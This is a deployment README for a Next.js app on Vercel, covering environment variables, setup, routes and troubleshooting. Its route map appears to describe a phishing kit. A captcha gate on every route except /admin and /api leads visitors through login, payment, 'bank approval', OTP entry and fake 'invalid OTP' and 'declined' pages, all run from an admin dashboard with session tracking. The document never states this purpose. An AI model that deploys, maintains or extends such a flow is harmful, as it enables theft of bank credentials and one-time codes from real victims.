# Deployment to Vercel

## Overview
This is a Next.js 15 application optimized for Vercel deployment. The app has been migrated from Vite + Express to Next.js with full feature parity.

## Architecture
- **Framework**: Next.js 15 (App Router)
- **Backend**: Node.js API Routes
- **Frontend**: React 19 with Tailwind CSS 4
- **Database**: MySQL with Drizzle ORM
- **Auth**: OAuth + JWT
- **Build Tool**: Next.js (Turbopack)

## Quick Start: Deploy to Vercel

### Step 1: Push to GitHub
```bash
git add .
git commit -m "Migrate to Next.js - Ready for Vercel"
git push origin main
```

### Step 2: Create Vercel Project
1. Go to [vercel.com](https://vercel.com)
2. Click "Add New..." → "Project"
3. Select your GitHub repository
4. Vercel will auto-detect Next.js framework

### Step 3: Set Environment Variables
In Vercel dashboard, go to **Settings > Environment Variables** and add:

| Variable | Required | Description |
|---|---|---|
| `OAUTH_SERVER_URL` | Yes | OAuth server (https://api.manus.im) |
| `VITE_APP_ID` | Yes | OAuth application ID |
| `VITE_OAUTH_PORTAL_URL` | Yes | OAuth portal (https://manus.im) |
| `OWNER_OPEN_ID` | Yes | Owner's OpenID |
| `JWT_SECRET` | Yes | Session secret (32+ characters) |
| `DATABASE_URL` | Yes | MySQL connection string |
| `NEXT_PUBLIC_APP_URL` | Yes | Your app URL |
| `AWS_ACCESS_KEY_ID` | No | For S3 file uploads |
| `AWS_SECRET_ACCESS_KEY` | No | For S3 file uploads |
| `AWS_S3_BUCKET` | No | For S3 file uploads |
| `AWS_S3_REGION` | No | For S3 file uploads |

### Step 4: Deploy
Click the "Deploy" button. Vercel will:
1. Run `pnpm install`
2. Run `next build`
3. Deploy to production

## Local Development

### Setup
```bash
# Install dependencies
pnpm install

# Copy environment template
cp .env.example .env.local

# Edit .env.local with your settings
# Then run database migrations
pnpm db:push

# Start dev server
pnpm dev
```

Visit http://localhost:3000 to test locally.

## Environment Variables Reference

### Required for Production
```
OAUTH_SERVER_URL=https://api.manus.im
VITE_APP_ID=your_oauth_app_id
VITE_OAUTH_PORTAL_URL=https://manus.im
OWNER_OPEN_ID=your_owner_open_id
JWT_SECRET=your_secret_min_32_characters_long
DATABASE_URL=mysql://user:password@host:3306/database
NEXT_PUBLIC_APP_URL=https://yourdomain.vercel.app
```

### Optional for S3 Integration
```
AWS_ACCESS_KEY_ID=your_aws_key
AWS_SECRET_ACCESS_KEY=your_aws_secret
AWS_S3_BUCKET=your-bucket-name
AWS_S3_REGION=us-east-1
```

## Application Routes

### Public Pages
- `/` - Captcha verification page
- `/admin` - Admin dashboard
- `/404` - Not found page

### Protected Pages (after captcha)
- `/login` - User login
- `/payment` - Payment processing
- `/bank-app` - Bank approval flow
- `/otp` - OTP verification
- `/invalid-otp` - Invalid OTP error
- `/declined` - Payment declined error

### API Endpoints
- `/api/trpc/*` - tRPC endpoints
- `/api/session-offline` - Session management

## Middleware & Security

### Captcha Guard
Next.js middleware (`middleware.ts`) ensures:
- All routes except `/admin` and `/api` require captcha verification
- Implemented via cookies and session tracking
- Redirects to home page if captcha not verified

### Headers
Vercel auto-applies security headers:
- X-Content-Type-Options: nosniff
- X-Frame-Options: DENY
- X-XSS-Protection: 1; mode=block
- Referrer-Policy: strict-origin-when-cross-origin

## Troubleshooting

### Build Fails
**Error**: Missing environment variables
- **Solution**: Check all required vars are set in Vercel dashboard

**Error**: Database connection fails
- **Solution**: Verify DATABASE_URL is correct and reachable from Vercel servers

**Error**: OAuth errors
- **Solution**: Check OAUTH_SERVER_URL and VITE_APP_ID are correct

### Runtime Issues

**Page shows 404 after captcha**
- Middleware not executed correctly
- Clear browser cache and cookies
- Check middleware.ts exists in root directory

**API routes return 500**
- Check Vercel function logs
- Verify environment variables are set
- Check database connection

**Session tracking not working**
- Ensure cookies are enabled
- Check localStorage isn't cleared on navigation
- Verify sessionId in SessionContext

## Performance & Monitoring

### Vercel Dashboard
- **Analytics**: View traffic, latency, and errors
- **Logs**: Real-time function and edge logs
- **Deployments**: Track version history
- **Domains**: Manage custom domains

### Enable Web Analytics
1. Go to **Settings > Analytics**
2. Enable "Web Analytics"
3. View metrics in dashboard

### Cold Start Optimization
- API routes are serverless functions
- First request may be slower (~1-2s)
- Subsequent requests are much faster
- Consider caching for frequently accessed data

## Custom Domain

1. Go to **Settings > Domains**
2. Add your custom domain
3. Update DNS records at your domain provider
4. Vercel manages SSL automatically

## Database Considerations

### MySQL Requirements
- Must be accessible from Vercel IP ranges
- Connection pooling recommended for high traffic
- Set appropriate max_connections limit

### Drizzle ORM
- Migrations run during deployment if configured
- Schema in `drizzle/schema.ts`
- Run migrations locally before deploy: `pnpm db:push`

## Deployment Checklist

- [ ] All environment variables set in Vercel
- [ ] DATABASE_URL is reachable from Vercel
- [ ] OAuth credentials are correct
- [ ] JWT_SECRET is 32+ characters
- [ ] NEXT_PUBLIC_APP_URL matches your domain
- [ ] GitHub repository is connected
- [ ] .gitignore prevents uploading .env files
- [ ] Build succeeds without warnings
- [ ] Captcha page loads correctly
- [ ] OAuth flow works end-to-end
- [ ] Admin panel is accessible

## Rollback

To revert to a previous version:
1. Go to **Deployments** tab
2. Find the working deployment
3. Click **More** → **Promote to Production**

## Support

- [Next.js Documentation](https://nextjs.org/docs)
- [Vercel Documentation](https://vercel.com/docs)
- [Vercel Status Page](https://status.vercel.com)
- Check [MIGRATION.md](./MIGRATION.md) for detailed migration info
